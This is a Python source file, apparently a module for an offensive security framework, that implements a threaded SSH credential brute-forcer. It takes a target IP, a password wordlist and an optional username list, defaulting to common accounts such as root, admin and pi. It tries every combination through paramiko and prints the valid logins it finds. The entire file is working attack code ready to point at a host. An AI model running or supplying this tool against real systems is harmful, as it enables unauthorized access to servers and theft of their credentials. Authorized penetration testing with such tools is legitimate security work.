import socket
import threading
import queue
import time

NAME        = "SSH Credential Bruteforcer"
DESCRIPTION = "Threaded SSH brute force with wordlist or user:pass file"
AUTHOR      = "Wraith"
VERSION     = "2.0"
NOTES       = "Requires: pip install paramiko. Set USERLIST or inline USER."

OPTIONS = {
    "IP":        {"description": "Target IP",                              "required": True,  "default": None},
    "PORT":      {"description": "SSH port",                               "required": False, "default": "22"},
    "USER":      {"description": "Single username (overrides USERLIST)",   "required": False, "default": None},
    "USERLIST":  {"description": "Path to usernames file",                 "required": False, "default": None},
    "WORDLIST":  {"description": "Path to passwords file",                 "required": True,  "default": None},
    "THREADS":   {"description": "Concurrent attempts",                    "required": False, "default": "4"},
    "TIMEOUT":   {"description": "Connection timeout (s)",                 "required": False, "default": "5"},
    "STOP":      {"description": "Stop on first valid credential",         "required": False, "default": "true"},
}

def try_login(ip, port, user, password, timeout):
    try:
        import paramiko
        c = paramiko.SSHClient()
        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        c.connect(ip, port=port, username=user, password=password,
                  timeout=timeout, allow_agent=False, look_for_keys=False)
        c.close()
        return True
    except Exception:
        return False

def worker(ip, port, combo_queue, results, lock, stop_flag, timeout, tried):
    while not stop_flag[0]:
        try:
            user, password = combo_queue.get_nowait()
        except queue.Empty:
            break
        try:
            with lock:
                tried[0] += 1
            success = try_login(ip, port, user, password, timeout)
            if success:
                with lock:
                    results.append((user, password))
                    if stop_flag[0] is False:
                        pass  # print handled outside
                if stop_flag[0] is not True:
                    stop_flag[0] = True
        except Exception:
            pass
        finally:
            combo_queue.task_done()

def run(opts):
    try:
        import paramiko
    except ImportError:
        print("  \033[91m[!]\033[0m paramiko not installed: pip install paramiko")
        return

    ip       = opts.get("IP")
    port     = int(opts.get("PORT") or 22)
    timeout  = float(opts.get("TIMEOUT") or 5)
    threads  = int(opts.get("THREADS") or 4)
    stop     = (opts.get("STOP") or "true").lower() not in ("false", "0", "no")
    userlist = opts.get("USERLIST")
    user_opt = opts.get("USER")
    wordlist = opts.get("WORDLIST")

    # load usernames
    if user_opt:
        users = [user_opt]
    elif userlist:
        try:
            with open(userlist) as f:
                users = [l.strip() for l in f if l.strip()]
        except Exception as e:
            print(f"  \033[91m[-]\033[0m Cannot read USERLIST: {e}")
            return
    else:
        users = ["root", "admin", "ubuntu", "pi", "user"]

    # load passwords
    try:
        with open(wordlist) as f:
            passwords = [l.strip() for l in f if l.strip()]
    except Exception as e:
        print(f"  \033[91m[-]\033[0m Cannot read WORDLIST: {e}")
        return

    combos = [(u, p) for u in users for p in passwords]
    print(f"  \033[96m[*]\033[0m Target   : {ip}:{port}")
    print(f"  \033[96m[*]\033[0m Users    : {len(users)}  Passwords: {len(passwords)}  Combos: {len(combos)}")
    print(f"  \033[96m[*]\033[0m Threads  : {threads}  Stop on first: {stop}")
    print()

    cq        = queue.Queue()
    results   = []
    lock      = threading.Lock()
    stop_flag = [False]
    tried     = [0]

    for combo in combos:
        cq.put(combo)

    workers = [threading.Thread(target=worker, args=(ip, port, cq, results, lock, stop_flag, timeout, tried), daemon=True)
               for _ in range(min(threads, len(combos)))]
    for w in workers:
        w.start()

    total = len(combos)
    while not cq.empty() and not stop_flag[0]:
        with lock:
            done = tried[0]
        print(f"  \033[2m  Tried: {done}/{total}  Found: {len(results)}\033[0m", end="\r")
        time.sleep(0.3)

    for w in workers:
        w.join(timeout=1)
    print(" " * 50, end="\r")

    if results:
        print(f"  \033[92m[+]\033[0m {len(results)} valid credential(s):\n")
        for user, pw in results:
            print(f"  \033[92m  [+]\033[0m  {user}:{pw}")
    else:
        print(f"  \033[91m[-]\033[0m No valid credentials found ({tried[0]} tried)")
    print()
